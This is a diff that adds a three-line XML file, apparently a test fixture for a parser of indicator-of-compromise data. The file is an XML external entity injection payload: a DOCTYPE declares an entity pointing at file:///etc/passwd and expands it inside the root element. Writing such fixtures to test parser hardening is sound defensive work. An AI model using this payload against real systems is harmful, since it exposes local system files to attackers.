@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+<ioc>&x;</ioc>
